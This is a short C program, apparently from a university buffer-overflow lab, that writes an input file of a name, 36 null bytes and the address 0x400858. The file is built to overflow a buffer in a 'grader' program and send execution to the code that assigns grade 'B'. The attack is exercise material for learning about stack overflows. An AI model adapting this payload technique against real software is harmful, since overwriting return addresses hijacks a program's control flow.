/*-------------------------------------------------
Authors: Christian Ronda and Christopher Paucar
createdataB.c
--------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
/*generates dataB file which is used as input to grader program                                     which will be used in our B attack. Returns 0.*/
int main(void){
    int i;
    unsigned long uiData;
    FILE *psFile;
    /*this is the address where grade='B'*/
    uiData = 0x400858;
    psFile = fopen("dataB", "w");
    /*put "Chris Paucar" in dataB file*/
    fprintf(psFile,"Chris Paucar");
    /*add 36 null bytes*/
    for(i = 0; i < 36; i++){
        putc('\0', psFile);
    }
    /*put the address where grade ='B'(0x400858) into dataB file*/
    fwrite(&uiData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
